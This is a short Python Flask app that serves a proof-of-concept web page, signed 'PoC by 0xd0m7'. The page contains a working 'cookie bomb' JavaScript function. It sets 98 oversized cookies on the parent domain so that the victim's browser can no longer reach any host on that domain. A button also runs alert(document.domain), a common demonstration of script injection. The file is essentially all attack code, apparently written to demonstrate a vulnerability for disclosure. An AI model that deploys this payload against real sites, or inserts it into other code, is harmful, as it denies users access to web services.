from flask import Flask
app = Flask(__name__)

@app.route("/")
def hello():
		poc = """<html>
<script>
	function cookiebomb(){
		var d = document.domain.split(".").splice(-2).join(".");
		var pollution = Array(4000).join('a');
		for(var i=1;i<99;i++){
			document.cookie='bomb'+i+'='+pollution+';Domain='+d+';Path=/';
		}
		setTimeout(()=>{alert("Cookie bomb complete! You can no longer access any host on "+d+" in your browser.")}, 1000);
	}
</script>
<h1>PoC by 0xd0m7</h1>
<button onclick="alert(document.domain)">Alert</button><br><br>
<button onclick="cookiebomb()">Cookie bomb</button>
</html>
		"""
		return poc
